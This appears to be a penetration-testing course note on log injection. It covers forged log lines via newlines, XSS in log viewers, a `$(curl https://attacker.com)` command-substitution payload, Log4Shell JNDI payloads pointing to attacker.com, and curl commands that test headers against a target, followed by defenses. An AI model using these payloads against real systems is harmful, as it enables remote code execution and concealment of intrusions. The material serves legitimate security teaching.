---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.08 Log Injection"
---

# 10.08 — Log Injection

## What is Log Injection?

Log Injection occurs when user input is written to log files without sanitization. Attackers can inject fake log entries to:
- Confuse incident responders
- Hide attack activities  
- Trigger vulnerable log processing scripts
- Escalate to stored XSS if logs are viewed in a web interface
- Escalate to SSTI or command injection if logs are processed by shell scripts

```
VULNERABLE LOGGING:
  LOG FORMAT: [timestamp] [level] User 'USERNAME' logged in
  
  Logger.info("User '" + username + "' logged in");
  
  NORMAL:  [2024-01-01] [INFO] User 'john' logged in
  
  INJECT username: john' logged in
                   [2024-01-01] [INFO] Admin 'root' logged in
  
  LOG BECOMES:
  [2024-01-01] [INFO] User 'john' logged in
  [2024-01-01] [INFO] Admin 'root' logged in [rest of real log]
  
  → Fake "Admin 'root' logged in" entry created!
  → Security team sees fake root login!
```

---

## Log Injection Payloads

```
INJECT FAKE LOG ENTRIES:
  Username: admin\nFAKE LOG ENTRY: ADMIN LOGGED IN SUCCESSFULLY
  
  Using \n (newline) to create new log lines:
  Input: john\n[2024-01-01 12:00:00] [INFO] Admin 'root' logged in from 127.0.0.1

FOR WEB LOG VIEWER (XSS via logs):
  Username: <script>alert(1)</script>
  → If logs are displayed in a web admin panel without encoding → XSS!

FOR SHELL PROCESSING (command injection via logs):
  Username: $(curl https://attacker.com)
  → If log is processed with: while read line; do echo "$line"; done < log.txt
  → Command substitution executes!
```

---

## Log4Shell (CVE-2021-44228) — Most Famous Log Injection

```
WHAT IT WAS:
  Java's Log4j library supported JNDI lookups in log messages
  If log message contained: ${jndi:ldap://attacker.com/x}
  → Log4j would make an LDAP request to attacker.com!
  → Attacker returns a Java class → REMOTE CODE EXECUTION!

WHERE IT APPEARED:
  ANY user-controllable input that got logged:
  User-Agent header → logged by many apps
  Username field → logged at login
  X-Forwarded-For → logged for IP tracking
  HTTP request path → access logs

PAYLOAD:
  User-Agent: ${jndi:ldap://attacker.com/Exploit}
  
  Log entry: [INFO] Request from User-Agent: ${jndi:ldap://attacker.com/Exploit}
  → Log4j processes ${...} → makes LDAP call → RCE!

STILL RELEVANT:
  Many unpatched systems remain!
  Test: ${jndi:ldap://your-interactsh.com/x}
  → If Interactsh receives DNS/LDAP lookup → vulnerable!
```

---

## Testing for Log Injection

```bash
# STEP 1: INJECT NEWLINE IN USER INPUTS:
?username=admin%0aFAKE:ENTRY
# %0a = newline

# STEP 2: CHECK IF REFLECTED IN LOGS:
# If you have access to logs → check for fake entry
# If admin view shows logs → look for your injected entry

# STEP 3: TEST FOR XSS IN LOG VIEWER:
?username=<script>alert(1)</script>
# If admin log panel shows alert → stored XSS via log injection!

# STEP 4: TEST LOG4SHELL:
# Any HTTP header that gets logged:
curl -H "User-Agent: \${jndi:ldap://YOUR.interactsh.com/x}" https://target.com/
curl -H "X-Api-Version: \${jndi:ldap://YOUR.interactsh.com/x}" https://target.com/
# Check Interactsh for incoming requests → Log4Shell!

# COMMON HEADERS TO TEST FOR LOG4SHELL:
# User-Agent, X-Forwarded-For, Referer, X-Api-Version,
# Accept-Language, Authorization, Cookie value
```

---

## Impact

```
LOG INJECTION IMPACT:
  1. Fake log entries → confuse forensic investigation
  2. Hide real attacker's IP by injecting fake IPs
  3. Frame other users/IPs for malicious activity
  4. XSS in log viewer → admin account takeover
  5. Command injection via logs → server RCE
  6. Log4Shell → immediate RCE (critical!)

SEVERITY:
  Simple log spoofing:   Low
  XSS in log viewer:     Medium-High
  Log4Shell:             Critical (9.8 CVSS)
```

---

## Defense

```
PROTECTION:
  1. Sanitize log input — encode or strip \r\n:
     Java: message = message.replace('\n', ' ').replace('\r', ' ');
     Python: message = message.replace('\n', '\\n').replace('\r', '\\r')
  
  2. Use structured logging (JSON format):
     Instead of string interpolation:
     logger.info("User {} logged in", username)  ← uses % formatting
     → JSON: {"event":"login","user":"injected_value"}
     → The value is quoted/escaped in JSON → injection doesn't create new log fields!
  
  3. For Log4Shell specifically — PATCH Log4j!
     Log4j 2.17.1+ = no JNDI by default
     log4j2.formatMsgNoLookups=true = disable message lookups
  
  4. Encode HTML if logs are displayed in web interface
  
  5. Never run shell commands that process raw log lines
```

---

## Related Notes
- [[06 - Command Injection via HTTP Headers]] — user-agent injection
- [[09 - CRLF Injection]] — CRLF injection for new log lines
- [[Module 07 - XSS]] — XSS in log viewers
